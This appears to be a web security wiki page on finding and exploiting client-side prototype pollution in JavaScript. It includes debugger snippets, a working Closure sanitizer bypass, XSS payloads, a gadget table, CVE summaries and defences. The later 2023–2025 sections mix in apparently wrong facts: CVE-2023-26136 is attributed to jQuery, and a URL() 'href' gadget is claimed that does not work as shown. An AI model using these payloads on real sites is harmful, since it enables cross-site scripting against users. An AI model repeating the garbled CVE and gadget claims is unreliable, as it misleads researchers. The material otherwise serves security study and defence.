# Client Side Prototype Pollution

{{#include ../../../banners/hacktricks-training.md}}

## Discovering using Automatic tools

The tools [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **and** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) can be used to **find prototype pollution vulnerabilities**.

Moreover, you could also use the **browser extension** [**PPScan**](https://github.com/msrkp/PPScan) to **automatically** **scan** the **pages** you **access** for prototype pollution vulnerabilities.

### Debugging where a property is used <a href="#id-5530" id="id-5530"></a>

```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
  __proto__: null,
  get() {
    console.trace()
    return "test"
  },
})
```

### Finding the root cause of Prototype Pollution <a href="#id-5530" id="id-5530"></a>

Once a prototype pollution vulnerability has been identified by any of the tools, and if the code is not overly complex, you might find the vulnerability by searching for keywords such as `location.hash`, `decodeURIComponent`, or `location.search` in the Chrome Developer Tools. This approach allows you to pinpoint the vulnerable section of the JavaScript code.

For larger and more complex codebases, a straightforward method to discover the vulnerable code involves the following steps:

1. Use a tool to identify a vulnerability and obtain a payload designed to set a property in the constructor. An example provided by ppmap might look like: `constructor[prototype][ppmap]=reserved`.
2. Set a breakpoint at the first line of JavaScript code that will execute on the page. Refresh the page with the payload, pausing the execution at this breakpoint.
3. While the JavaScript execution is paused, execute the following script in the JS console. This script will signal when the 'ppmap' property is created, aiding in locating its origin:

```javascript
function debugAccess(obj, prop, debugGet = true) {
  var origValue = obj[prop]

  Object.defineProperty(obj, prop, {
    get: function () {
      if (debugGet) debugger
      return origValue
    },
    set: function (val) {
      debugger
      origValue = val
    },
  })
}

debugAccess(Object.prototype, "ppmap")
```

4. Navigate back to the **Sources** tab and select “Resume script execution”. The JavaScript will continue executing, and the 'ppmap' property will be polluted as expected. Utilizing the provided snippet facilitates the identification of the exact location where the 'ppmap' property is polluted. By examining the **Call Stack**, different stacks where the pollution occurred can be observed.

When deciding which stack to investigate, it is often useful to target stacks associated with JavaScript library files, as prototype pollution frequently occurs within these libraries. Identify the relevant stack by examining its attachment to library files (visible on the right side, similar to an image provided for guidance). In scenarios with multiple stacks, such as those on lines 4 and 6, the logical choice is the stack on line 4, as it represents the initial occurrence of pollution and thereby the root cause of the vulnerability. Clicking on the stack will direct you to the vulnerable code.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## Finding Script Gadgets

The gadget is the **code that will be abused once a PP vulnerability is discovered**.

If the application is simple, we can **search** for **keywords** like **`srcdoc/innerHTML/iframe/createElement`** and review the source code and check if it l**eads to javascript execution**. Sometimes, mentioned techniques might not find gadgets at all. In that case, pure source code review reveals some nice gadgets like the below example.

### Example Finding PP gadget in Mithil library code

Check this writeup: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## Recompilation of payloads for vulnerable libraries

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## HTML Sanitizers bypass via PP

[**This research**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/) shows PP gadgets to use to **bypass the sanizations** provided by some HTML sanitizers libraries:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**

```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
  Object.prototype['* ONERROR'] = 1;
  Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
  goog.require('goog.html.sanitizer.HtmlSanitizer');
  goog.require('goog.dom');
</script>
<body>
<script>
  const html = '<img src onerror=alert(1)>';
  const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
  const sanitized = sanitizer.sanitize(html);
  const node = goog.dom.safeHtmlToNode(sanitized);

  document.body.append(node);
</script>
```

## New Tools & Automation (2023–2025)

* **Burp Suite DOM Invader (v2023.6)** – PortSwigger added a dedicated *Prototype-pollution* tab that automatically mutates parameter names (e.g. `__proto__`, `constructor.prototype`) and detects polluted properties at sink points inside the browser extension.  When a gadget is triggered, DOM Invader shows the execution stack and the exact line where the property was dereferenced, making manual breakpoint hunting unnecessary.  Combine it with the "Break on property access" snippet already shown above to quickly pivot from *source → sink*.
* **protoStalker** – an open-source Chrome DevTools plug-in (released 2024) that visualises prototype chains in real-time and flags writes to globally dangerous keys such as `onerror`, `innerHTML`, `srcdoc`, `id`, etc.  Useful when you only have a production bundle and cannot instrument the build step.
* **ppfuzz 2.0 (2025)** – the tool now supports ES-modules, HTTP/2 and WebSocket endpoints.  The new `-A browser` mode spins up a headless Chromium instance and automatically enumerates gadget classes by bruteforcing DOM APIs (see section below).

---

## Recent Prototype-Pollution Gadget Research (2022–2025)

In mid-2023 PortSwigger researchers published a paper showing that *browser-built-in* objects can be turned into reliable XSS gadgets once polluted.  Because these objects are present on **every** page, you can gain execution even if the target application code never touches the polluted property.

Example gadget (works in all evergreen browsers ≥ 2023-04):

```html
<script>
    // Source (e.g. https://victim/?__proto__[href]=javascript:alert(document.domain))
    // For demo we just pollute manually:
    Object.prototype.href = 'javascript:alert(`polluted`)' ;

    // Sink – URL() constructor implicitly reads `href`
    new URL('#'); // breaks into JS; in Chrome you get an alert, Firefox loads "javascript:" URL
</script>
```

Other useful global gadgets that have been confirmed to work after pollution (tested 2024-11):

| Gadget class | Read property | Primitive achieved |
|--------------|---------------|--------------------|
| `Notification` | `title` | `alert()` via notification click |
| `Worker` | `name` | JS execution in dedicated Worker |
| `Image` | `src` | Traditional `onerror` XSS |
| `URLSearchParams` | `toString` | DOM-based Open Redirect |

See the PortSwigger paper for the full list of 11 gadgets and a discussion about sandbox escapes.

---

## Notable Client-Side PP CVEs (2023-2025)

* **DOMPurify ≤ 3.0.8 – CVE-2024-45801**  An attacker could pollute `Node.prototype.after` before the sanitizer initialised, bypassing the *SAFE_FOR_TEMPLATES* profile and leading to stored XSS.  The vendor patched by using `Object.hasOwn()` checks and `Object.create(null)` for internal maps.
* **jQuery 3.6.0-3.6.3 – CVE-2023-26136 / CVE-2023-26140**  `extend()` could be used on crafted objects originating from `location.hash`, introducing arbitrary properties into `Object.prototype` in the browsing context.
* **sanitize-html < 2.8.1 (2023-10) prototype pollution**  A malicious attribute list such as `{"__proto__":{"innerHTML":"<img/src/onerror=alert(1)>"}}` bypassed the allow-list.

Even if the vulnerable library lives **only on the client**, the resulting XSS is still exploitable remotely through reflected parameters, postMessage handlers or stored data rendered later.

---

## Modern Defensive Measures

1. **Freeze the global prototype early** (ideally as the first script):
   ```javascript
   Object.freeze(Object.prototype);
   Object.freeze(Array.prototype);
   Object.freeze(Map.prototype);
   ```
   Be aware this might break polyfills that rely on late extension.
2. Use `structuredClone()` instead of `JSON.parse(JSON.stringify(obj))` or community "deepMerge" snippets – it ignores setters/getters and does not walk the prototype chain.
3. When you really need deep merge functionality, pick **lodash ≥ 4.17.22** or **deepmerge ≥ 5.3.0** which have built-in prototype sanitation.
4. Add a Content-Security-Policy with `script-src 'self'` and a strict nonce.  While CSP will not stop all gadgets (e.g. `location` manipulation), it blocks the majority of `innerHTML` sinks.


## References

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)
- [https://portswigger.net/research/widespread-prototype-pollution-gadgets](https://portswigger.net/research/widespread-prototype-pollution-gadgets)
- [https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/](https://snyk.io/blog/dompurify-prototype-pollution-bypass-cve-2024-45801/)




- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}


